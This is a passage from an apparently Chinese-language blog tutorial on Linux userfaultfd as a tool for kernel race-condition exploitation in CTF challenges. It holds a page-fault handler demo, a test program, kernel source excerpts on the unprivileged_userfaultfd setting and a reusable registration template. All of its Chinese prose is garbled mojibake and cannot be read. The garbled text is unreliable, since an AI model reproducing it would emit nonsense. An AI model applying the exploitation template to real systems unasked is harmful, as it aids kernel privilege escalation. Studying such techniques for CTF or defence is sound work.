class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ‰äººå¯èƒ½æ³¨æ„åˆ°äº† <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> è¿™ä¸ªå¥‡æ€ªçš„å¥å­ï¼Œåœ¨è¿™é‡Œä½œç”¨æ˜¯å°†è§¦å‘ç¼ºé¡µå¼‚å¸¸çš„åœ°å€<strong>æŒ‰é¡µå¯¹é½</strong>ä½œä¸ºåç»­æ‹·è´çš„èµ·å§‹åœ°å€</p>
<blockquote>
<p> æ¯”å¦‚è¯´è§¦å‘çš„åœ°å€å¯èƒ½æ˜¯ 0xdeadbeefï¼Œç›´æ¥ä»è¿™é‡Œå¼€å§‹æ‹·è´ä¸€æ•´é¡µçš„æ•°æ®å°±æ‹·æ­ªäº†ï¼Œåº”å½“ä» 0xdeadb000 å¼€å§‹æ‹·è´ï¼ˆå‡è®¾é¡µå¤§å° 0x1000ï¼‰</p>
</blockquote>
<h4 id="ä¾‹ç¨‹"><a href="#ä¾‹ç¨‹" class="headerlink" title="ä¾‹ç¨‹"></a>ä¾‹ç¨‹</h4><p>æµ‹è¯•ä¾‹ç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>    <span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">        demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">        actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">        the userfaultfd. */</span><br>    len = <span class="hljs-number">0x1000</span>;<br>    addr = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>    <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>    <span class="hljs-type">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br><br>    <span class="hljs-comment">/* Trigger the userfaultfd event */</span><br>    <span class="hljs-type">void</span> * ptr = (<span class="hljs-type">void</span>*) *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*) addr;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %p\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>èµ·ä¸ªè™šæ‹Ÿæœºè·‘ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æˆ‘ä»¬ç›‘è§†çš„åŒ¿åé¡µå†…æˆåŠŸåœ°è¢«æˆ‘ä»¬å†™å…¥äº†æƒ³è¦çš„æ•°æ®</p>
<p><img src="https://i.loli.net/2021/09/08/7iQO1b64XNaTkG8.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—-userfaultfd-åœ¨-race-condition-ä¸­çš„åˆ©ç”¨"><a href="#æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—-userfaultfd-åœ¨-race-condition-ä¸­çš„åˆ©ç”¨" class="headerlink" title="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ— userfaultfd åœ¨ race condition ä¸­çš„åˆ©ç”¨"></a>æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ— userfaultfd åœ¨ race condition ä¸­çš„åˆ©ç”¨</h3><p>æ­£æ‰€è°“â€œæ²¡æœ‰ä¸‡èƒ½çš„é“¶å¼¹â€ï¼Œå¯èƒ½æœ‰çš„äººä¼šå‘ç°åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­ userfaultfd ç³»ç»Ÿè°ƒç”¨æ— æ³•æˆåŠŸå¯åŠ¨ï¼š</p>
<p><img src="https://i.loli.net/2021/09/08/e2LRJKzQVYSTO5k.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™æ˜¯å› ä¸ºåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­ä¿®æ”¹äº†å˜é‡ <code>sysctl_unprivileged_userfaultfd</code> çš„å€¼ï¼š</p>
<blockquote>
<p>æ¥è‡ª linux-5.11 æºç <code>fs/userfaultfd.c</code>ï¼š</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;<br><span class="hljs-comment">//...</span><br>SYSCALL_DEFINE1(userfaultfd, <span class="hljs-type">int</span>, flags)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userfaultfd_ctx</span> *<span class="hljs-title">ctx</span>;</span><br>    <span class="hljs-type">int</span> fd;<br><br>    <span class="hljs-keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;<br>        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="hljs-number">0</span> &amp;&amp;<br>        !capable(CAP_SYS_PTRACE)) &#123;<br>        printk_once(KERN_WARNING <span class="hljs-string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span><br>            <span class="hljs-string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br>            <span class="hljs-string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EPERM;<br>    &#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>æ¥è‡ª linux-5.4 æºç <code>fs/userfaultfd.c</code>ï¼š</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>åœ¨ä¹‹å‰çš„ç‰ˆæœ¬å½“ä¸­ <code>sysctl_unprivileged_userfaultfd</code> è¿™ä¸€å˜é‡è¢«åˆå§‹åŒ–ä¸º <code>1</code>ï¼Œè€Œåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸å½“ä¸­è¿™ä¸€å˜é‡å¹¶æ²¡æœ‰è¢«èµ‹äºˆåˆå§‹å€¼ï¼Œ<strong>ç¼–è¯‘å™¨ä¼šå°†å…¶æ”¾åœ¨ bss æ®µï¼Œé»˜è®¤å€¼ä¸º 0</strong></p>
<p>è¿™æ„å‘³ç€åœ¨è¾ƒæ–°ç‰ˆæœ¬å†…æ ¸ä¸­<strong>åªæœ‰ root æƒé™æ‰èƒ½ä½¿ç”¨ userfaultfd</strong>ï¼Œè¿™æˆ–è®¸æ„å‘³ç€åˆšåˆšè¿›å…¥å¤§ä¼—è§†é‡çš„ userfaultfd å¯èƒ½åˆå°†é€æ¸æ·¡å‡ºå¤§ä¼—è§†é‡ï¼ˆ<del>å¾®åš@æ¥å»ä¹‹é—´</del>ï¼‰ï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯ï¼Œuserfaultfd ç¡®ä¹ä¸ºæˆ‘ä»¬åœ¨ Linux kernel ä¸­çš„æ¡ä»¶ç«äº‰åˆ©ç”¨æä¾›äº†ä¸€ä¸ªå…¨æ–°çš„æ€è·¯ä¸ä¸€ç§æå…¶ç¨³å®šçš„åˆ©ç”¨æ‰‹æ³•</p>
<h3 id="CTF-ä¸­çš„-userfaultfd-æ¿å­"><a href="#CTF-ä¸­çš„-userfaultfd-æ¿å­" class="headerlink" title="CTF ä¸­çš„ userfaultfd æ¿å­"></a>CTF ä¸­çš„ userfaultfd æ¿å­</h3><p>userfaultfd çš„æ•´ä¸ªæ“ä½œæµç¨‹æ¯”è¾ƒç¹çï¼Œæ•…ç¬”è€…ç°ç»™å‡ºå¦‚ä¸‹æ¿å­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨æ—¶ç›´æ¥è°ƒç”¨å³å¯ï¼š</p>
